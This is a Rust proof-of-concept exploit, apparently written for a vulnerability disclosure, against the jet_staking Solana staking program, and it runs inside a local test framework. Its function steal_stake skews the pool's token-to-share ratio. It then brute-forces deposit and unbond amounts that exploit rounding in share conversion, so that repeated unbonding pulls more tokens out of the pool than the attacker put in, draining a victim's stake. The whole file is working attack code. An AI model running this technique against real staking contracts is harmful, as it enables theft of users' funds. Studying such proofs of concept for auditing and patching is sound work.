mod framework;

use framework::{clone_keypair, Framework};
use std::error::Error;

use anchor_client::solana_sdk::program_pack::Pack;
use anchor_lang::AccountDeserialize;

use jet_staking::Amount;
use poc_framework::{solana_sdk::signer::Signer, Environment};

fn main() -> Result<(), Box<dyn Error>> {
    steal_stake()?;

    Ok(())
}

fn steal_stake() -> Result<(), Box<dyn Error>> {
    println!("stealing staked tokens..");

    let mut test_env = Framework::new()?;
    let attacker = clone_keypair(&test_env.attacker);
    let victim = clone_keypair(&test_env.victim);

    // setup
    test_env.init_stake_pool()?;
    test_env.create_user_auth(&attacker)?;
    test_env.create_user_auth(&victim)?;
    test_env.authenticate_user(&attacker)?;
    test_env.authenticate_user(&victim)?;
    test_env.init_stake_account(&attacker)?;
    test_env.init_stake_account(&victim)?;

    const INIT_CAPITAL: u64 = 10000;
    test_env.mint_vault_token(&attacker, INIT_CAPITAL)?;

    const BASE_AMT: u64 = 100;
    test_env.mint_vault_token(&victim, BASE_AMT)?;
    test_env.add_stake(&victim, BASE_AMT)?;

    // create inbalance
    // an attacker could create this imbalance because they'd recover
    // all their tokens eventually anyways
    test_env.env.mint_tokens(
        test_env.vault_token_mint.pubkey(),
        &test_env.pool_authority,
        test_env.stake_pool_vault_pubkey(),
        BASE_AMT, /* diff amt */
    );

    let mut _shares = BASE_AMT;
    let mut _tokens = BASE_AMT + BASE_AMT;

    let mut unbond_idx = 0;

    let start_amt = spl_token::state::Account::unpack(
        &test_env
            .env
            .get_account(test_env.stake_pool_vault_pubkey())
            .unwrap()
            .data,
    )?
    .amount;

    for _iter in 0..200 {
        let mut stake_pool = jet_staking::state::StakePool::try_deserialize(
            &mut &*test_env
                .env
                .get_account(test_env.stake_pool_pubkey())
                .unwrap()
                .data,
        )?;
        let stake_pool_token_cnt = spl_token::state::Account::unpack(
            &test_env
                .env
                .get_account(test_env.stake_pool_vault_pubkey())
                .unwrap()
                .data,
        )?
        .amount;
        let shares = stake_pool.shares_bonded + stake_pool.shares_unbonded;

        let mut max = 0;
        let mut max_unbonded = 0;
        let mut max_deposit_amt = 0;
        let mut max_transfer_amt = 0;
        for deposit_amt in 1..1000 {
            for transfer_amt in 0..200 {
                let deposited_shares = ((deposit_amt as u128) * (shares as u128)
                    / (stake_pool_token_cnt as u128)) as u64;

                let new_token_cnt = stake_pool_token_cnt + transfer_amt + deposit_amt;
                stake_pool.shares_bonded = shares + deposited_shares;
                stake_pool.shares_unbonded = 0;

                let mut found = false;
                let mut max_tokens_unbonded = std::cmp::max(
                    deposit_amt + transfer_amt,
                    new_token_cnt / stake_pool.shares_bonded + 1,
                );
                while stake_pool
                    .convert_amount(
                        new_token_cnt,
                        Amount {
                            kind: jet_staking::AmountKind::Tokens,
                            value: max_tokens_unbonded,
                        },
                    )?
                    .shares
                    <= deposited_shares as u64
                {
                    found = true;
                    max_tokens_unbonded += 1;
                }

                // adjust back to the real max unbonded
                max_tokens_unbonded -= 1;

                if found && max_tokens_unbonded > deposit_amt + transfer_amt {
                    let profit = max_tokens_unbonded - deposit_amt - transfer_amt;

                    if profit > max {
                        max_unbonded = max_tokens_unbonded;
                        max_deposit_amt = deposit_amt;
                        max_transfer_amt = transfer_amt;
                        max = profit;
                    }
                }
            }
        }

        if max != 0 {
            test_env.add_stake(&attacker, max_deposit_amt)?;

            // experimentally confirmed that we don't need to transfer any tokens actually
            assert!(max_transfer_amt == 0);
            test_env.mint_tokens(
                test_env.vault_token_mint.pubkey(),
                &clone_keypair(&test_env.pool_authority),
                test_env.stake_pool_vault_pubkey(),
                max_transfer_amt,
            )?;
            let _start_amt = spl_token::state::Account::unpack(
                &test_env
                    .env
                    .get_account(test_env.stake_pool_vault_pubkey())
                    .unwrap()
                    .data,
            )?
            .amount;
            test_env.unbond_stake_tokens(&attacker, unbond_idx, max_unbonded)?;
            unbond_idx += 1;
        }
    }

    let stake_pool_token_cnt = spl_token::state::Account::unpack(
        &test_env
            .env
            .get_account(test_env.stake_pool_vault_pubkey())
            .unwrap()
            .data,
    )?
    .amount;

    println!(
        "cost in staked tokens: {:?}",
        stake_pool_token_cnt - start_amt
    );

    for i in 0..unbond_idx {
        test_env.withdraw_unbonded_stake(&attacker, i)?;
    }

    let stake_pool_token_cnt = spl_token::state::Account::unpack(
        &test_env
            .env
            .get_account(test_env.stake_pool_vault_pubkey())
            .unwrap()
            .data,
    )?
    .amount;

    println!("start stake amt: {:?}", start_amt);
    println!("ending stake amt: {:?}", stake_pool_token_cnt);

    Ok(())
}
